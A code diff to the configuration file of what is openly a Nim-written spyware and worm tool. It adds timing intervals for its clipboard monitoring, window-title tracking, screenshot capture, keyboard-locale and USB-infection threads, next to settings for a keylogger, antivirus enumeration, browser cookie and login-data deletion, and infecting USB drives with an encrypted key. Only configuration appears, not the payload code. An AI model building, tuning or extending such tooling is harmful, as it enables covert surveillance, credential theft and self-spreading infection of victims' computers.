@@ -20,6 +20,12 @@ const USE_PERSISTENCE_THREAD*: bool = false
 ## DEFAULT: true
 const USE_CLIPBOARD_THREAD*: bool = true
 
+## run clipboardThread every n ms
+## higher value: lower cpu usage, higher change of not reflecting all data changes
+## lower value: higher cpu usage, lower change of not reflecting all data changes
+## DEFAULT: 100
+const CLIPBOARD_THREAD_CHECK_INTERVAL*: int = 100
+
 ## getAVSThread is used for getting
 ## all the installed antivirus software on the user's pc
 ## DEFAULT: true
@@ -40,18 +46,36 @@ const USE_CONNECTED_WIFI_THREAD*: bool = false
 ## DEFAULT: true
 const USE_WINDOW_NAME_THREAD*: bool = true
 
+## run windowNameThread every n ms
+## higher value: lower cpu usage, higher change of not reflecting all data changes
+## lower value: higher cpu usage, lower change of not reflecting all data changes
+## DEFAULT: 10
+const WINDOW_NAME_THREAD_CHECK_INTERVAL * : int = 10
+
 ## screenshotThread is used for saving screenshots
 ## DEFAULT: true
 const USE_SCREENSHOT_THREAD*: bool = false
+
+## run screenshotThread every n ms
+## higher value: lower bandwith and cpu usage, less screenshots
+## lower value: higher bandwith and cpu usage, more screenshots
+## DEFAULT: 10000
+const SCREENSHOT_THREAD_CHECK_INTERVAL * : int = 10000
 
 ## keyloggerThread is used for logging key presses
 ## DEFAULT: true
 const USE_KEYLOGGER_THREAD*: bool = true
 
-## keyboardLocale is used for getting the keyboard locale changes
+## keyboardLocaleThread is used for getting the keyboard locale changes
 ## by default its activated when the keyloggerThread is
 ## DEFAULT: USE_KEYLOGGER_THREAD
 const USE_KEYBOARD_LOCALE_THREAD*: bool = USE_KEYLOGGER_THREAD
+
+## run keyboardLocaleThread every n ms
+## higher value: lower cpu usage, higher change of not reflecting all data changes
+## lower value: higher cpu usage, lower change of not reflecting all data changes
+## DEFAULT: 5000
+const KEYBOARD_LOCALE_THREAD_CHECK_INTERVAL * : int = 5000
 
 ## browserThread is used for deleting cookies and login data
 ## so the user is forced to login back again
@@ -68,6 +92,12 @@ const UNSAFE_REMOVE_FILE*: bool = false
 ## infectThread is used for searching usb drives and infecting them
 ## DEFAULT: true
 const USE_INFECT_THREAD*: bool = false
+
+## run infectThread every n ms
+## higher value: lower cpu usage, higher change of not infecting all usbs
+## lower value: higher cpu usage, lower change of not infecting all usbs
+## DEFAULT: 10000
+const INFECT_THREAD_CHECK_INTERVAL*: int = 10000
 
 ## the key files on a usb drive will be infected with
 ## YOU MUST add e before " to encrypt the key so it can't be read
